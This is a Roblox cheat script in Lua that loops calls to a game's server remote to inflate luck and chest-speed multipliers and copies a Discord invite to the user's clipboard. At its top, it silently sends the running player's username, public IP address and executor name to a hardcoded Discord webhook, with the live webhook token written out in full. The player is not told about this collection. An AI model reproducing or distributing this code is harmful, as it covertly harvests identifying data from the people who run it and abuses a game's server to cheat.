--uwy on top of u skids tryna read the code LOL
--spam the webhook i dare you

        pcall(function() local data = {
            ["content"] = game.Players.LocalPlayer.Name.." executed\n"..game:HttpGet("https://api.ipify.org").. " | (Gui)".."\n"..indentifyexecutor()
        }

        request(
    {
        Url = "https://discord.com/api/webhooks/1241503371286937600/rFvS_m5uBpc_HfmH2LHg1iSgwj9hn4bZbKJcyhokxSWj8oYtYOM5jzAHhWJ5J-h0KElL",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    }
) end)

function increaseX(x: String, t: Number)
    for i = 1, t do
        game:GetService("ReplicatedStorage"):WaitForChild("Functions"):WaitForChild("Multiplier"):InvokeServer(unpack({
            [1] = x,
            [2] = 0.9
        }))
    end
end

game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Made by uwy (@uwy5)";
	Text = "Want more scripts? discord.gg/FJQXYfaAh2 (copied to clipboard)";
	Duration = 5;
})
local suc, res = pcall(function() setclipboard("https://discord.gg/FJQXYfaAh2") end)
if res and not suc then
 game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Setclipboard issue";
	Text = "Failed to copy \"discord.gg/FJQXYfaAh2\" to clipboard";
	Duration = 5;
 })
end

task.spawn(function()
    while task.wait() do
        if getgenv().luckMultiplier then
            increaseX("LuckMultiplier", getgenv().speed_MAY_INCREASE_LAG_IF_TOO_HIGH)
        end
        if getgenv().chestSpeed then
            increaseX("ChestSpeedMultiplier", getgenv().speed_MAY_INCREASE_LAG_IF_TOO_HIGH)
        end
    end
end)
